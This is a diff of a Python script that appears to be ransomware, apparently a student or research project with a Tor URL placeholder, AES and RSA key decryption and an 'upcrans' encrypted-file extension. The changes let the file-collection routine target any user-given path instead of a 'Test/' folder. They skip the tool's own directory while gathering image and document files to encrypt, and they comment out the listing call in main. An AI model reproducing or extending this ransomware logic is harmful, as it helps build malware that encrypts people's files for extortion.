@@ -18,6 +18,7 @@ from Database.keygenerator import class_keys
 import Database.sqlite as bbdd
 
 URL_TOR = ""
+PWD_RANS = os.path.dirname(os.path.abspath(__file__))
 
 if sys.version_info >= (3, 8, 0):
         import time
@@ -119,7 +120,7 @@ def decrypt_key(AESpath, RSApath):
 
 # List files of a system
 def list_files(args):
-    path = 'Test/'
+    path = args.path
     if args.encrypt == True:
         extensions = [
             'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
@@ -143,9 +144,12 @@ def list_files(args):
 
         files = []
         for r, d, f in os.walk(path):
-            for file in f:
-                if file.split('.')[-1] in extensions:
-                    files.append(os.path.join(r, file))
+            if r == PWD_RANS:
+                continue
+            else:
+                for file in f:
+                    if file.split('.')[-1] in extensions:
+                        files.append(os.path.join(r, file))
     else:  
         extensions = ['upcrans']
 
@@ -233,8 +237,8 @@ def decrypt_file(l_files, key):
         
 def main(): 
     args = parse_args()
-    l_files = list_files(args)
-    #l_files = []
+    #l_files = list_files(args)
+    l_files = []
 
     if args.encrypt == True:
         #Encrypt files of your system
@@ -246,7 +250,7 @@ def main():
         #Decrypt the encrypted files of your system
         AESkey = decrypt_key(args.AESkey, args.RSAkey)
         decrypt_file(l_files, AESkey)
-   
+
 
 if __name__ == "__main__":
     main()
